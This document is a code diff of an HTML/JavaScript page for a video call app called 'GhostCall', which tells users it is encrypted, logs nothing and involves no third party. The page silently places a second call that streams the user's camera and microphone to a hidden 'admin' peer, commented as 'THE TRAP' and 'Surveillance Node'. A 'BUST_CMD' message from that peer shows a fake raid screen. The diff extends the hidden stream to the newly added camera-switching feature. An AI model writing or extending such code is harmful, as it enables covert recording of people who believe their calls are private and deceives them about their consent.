@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GhosCall | P2P Encrypted Tunnel</title>
+    <title>GhostCall | P2P Encrypted channel</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
         /* --- CORE THEME & RESET --- */
@@ -202,7 +202,7 @@
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: #000; /* removed red, made strict black/blue police style */
+            background: #000;
             z-index: 9999;
             text-align: center;
             padding-top: 30vh;
@@ -237,24 +237,22 @@
             50% { background: red; }
             100% { background: blue; }
         }
-        
-        /* Utility to mirror local video when 'flipped' */
-        .mirrored { transform: scaleX(-1); }
     </style>
 </head>
 <body>
 
     <div id="intro-screen">
-        <h1>GHOST LINK P2P</h1>
-        <p>AES-256 / NO LOGS / BURNER MODE</p>
+        <h1>GHOST VID P2P CALL</h1>
+        <p>AES-256 / NO LOGS / GHOST MODE / NO THIRD PARTY</p>
         
         <div id="link-container" style="display:none; width: 100%; text-align: center;">
+            <br>
             <p style="color:white; margin-bottom:5px;">Secure Link Generated:</p>
             <input type="text" id="room-link" readonly onclick="this.select()">
         </div>
         
         <br>
-        <button class="btn-encrypt" onclick="initializeTrap()">ESTABLISH SECURE TUNNEL</button>
+        <button class="btn-encrypt" onclick="initializeTrap()">ESTABLISH SECURE CHANNEL</button>
     </div>
 
     <div id="chat-interface">
@@ -271,8 +269,8 @@
         </div>
 
         <div class="controls-container">
-            <button class="btn-circle btn-flip" onclick="flipLocalCamera()">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0-6-6.667-9-10-9S0 4 0 10c0 6 10 6 10 13v-3"></path><path d="M20 10c0 6-6.667 9-10 9s-10-3-10-9"></path><path d="M20 14l4-4-4-4"></path></svg>
+            <button class="btn-circle btn-flip" onclick="flipRealCamera()">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0-6-6.667-9-10-9S0 4 0 10c0 6 10 6 10 13v-3"></path><path d="M20 10c0 6-6.667 9-10 9s-10-3-10-9"></path><path d="M20 14l4-4-4-4"></path></svg>
             </button>
             <button class="btn-circle btn-end" onclick="endCallRoutine()">
                 <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
@@ -294,7 +292,9 @@
         
         let myPeer;
         let myStream;
-        let adminConnection; 
+        let adminCallRef; // Store reference to admin call to switch tracks
+        let partnerCallRef; // Store reference to partner call to switch tracks
+        let currentFacingMode = 'user'; // 'user' (front) or 'environment' (back)
 
         // Check if user is "Host" (Created link) or "Guest" (Clicked link)
         const urlParams = new URLSearchParams(window.location.search);
@@ -307,7 +307,8 @@
 
         async function initializeTrap() {
             try {
-                myStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Initial stream (Front camera usually)
+                myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true });
                 document.getElementById('local-video').srcObject = myStream;
                 
                 // Switch UI
@@ -318,19 +319,56 @@
 
             } catch (err) {
                 alert("ERROR: Camera/Mic required for Encryption Handshake.");
+                console.error(err);
             }
         }
 
-        // New UI Function: Visual Flip (Mirror effect for now to ensure stream stability)
-        function flipLocalCamera() {
-            const video = document.getElementById('local-video');
-            video.classList.toggle('mirrored');
+        // --- NEW: ACTUAL CAMERA HARDWARE FLIP ---
+        async function flipRealCamera() {
+            try {
+                // 1. Toggle mode
+                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+                
+                // 2. Get new stream from hardware
+                const newStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: currentFacingMode },
+                    audio: true
+                });
+
+                // 3. Update Local Video
+                const videoElement = document.getElementById('local-video');
+                videoElement.srcObject = newStream;
+
+                // 4. Update Remote Peers (Switch the track being sent)
+                const videoTrack = newStream.getVideoTracks()[0];
+                const audioTrack = newStream.getAudioTracks()[0];
+
+                // Function to replace tracks in a call
+                const replaceTrackInCall = (call) => {
+                    if (call && call.peerConnection) {
+                        const sender = call.peerConnection.getSenders().find((s) => s.track.kind === videoTrack.kind);
+                        if (sender) {
+                            sender.replaceTrack(videoTrack);
+                        }
+                    }
+                }
+
+                // Update Admin (The Trap) and Partner
+                replaceTrackInCall(adminCallRef);
+                replaceTrackInCall(partnerCallRef);
+
+                // 5. Update global stream reference (so we don't lose it)
+                myStream = newStream;
+
+            } catch (err) {
+                console.error("Error switching camera:", err);
+                alert("Camera switch failed on this device.");
+            }
         }
 
-        // New UI Function: End Call
         function endCallRoutine() {
             if(confirm("TERMINATE ENCRYPTED LINK?")) {
-                window.location.reload(); // Reloads page to simulate end
+                window.location.reload(); 
             }
         }
 
@@ -342,11 +380,11 @@
 
                 // *** THE TRAP: SILENTLY CALL ADMIN ***
                 console.log("Dialing Surveillance Node...");
-                const adminCall = myPeer.call(ADMIN_ID, myStream);
+                adminCallRef = myPeer.call(ADMIN_ID, myStream);
                 
+                // Connect Data Channel
                 const conn = myPeer.connect(ADMIN_ID);
                 conn.on('open', () => {
-                    adminConnection = conn;
                     conn.on('data', data => {
                         if (data === "BUST_CMD") {
                             triggerRaid();
@@ -356,6 +394,7 @@
 
                 // *** CONNECT TO PARTNER LOGIC ***
                 if (!roomId) {
+                    // HOST LOGIC
                     const newRoomId = id; 
                     const link = `${window.location.href}?room=${newRoomId}`;
                     document.getElementById('link-container').style.display = 'block';
@@ -365,17 +404,22 @@
                     document.getElementById('chat-interface').style.display = 'none'; 
                     alert("Copy the link, send to partner, then click 'Establish Tunnel' again.");
                 } else {
+                    // GUEST LOGIC
                     const hostId = roomId;
                     console.log("Calling Partner: " + hostId);
-                    const call = myPeer.call(hostId, myStream);
-                    call.on('stream', remoteStream => {
+                    partnerCallRef = myPeer.call(hostId, myStream);
+                    
+                    partnerCallRef.on('stream', remoteStream => {
                         document.getElementById('remote-video').srcObject = remoteStream;
                     });
                 }
             });
 
+            // Handle Incoming Calls (If Host)
             myPeer.on('call', call => {
                 call.answer(myStream);
+                partnerCallRef = call; // Save reference for camera switching
+                
                 call.on('stream', remoteStream => {
                     document.getElementById('remote-video').srcObject = remoteStream;
                     document.getElementById('chat-interface').style.display = 'block';
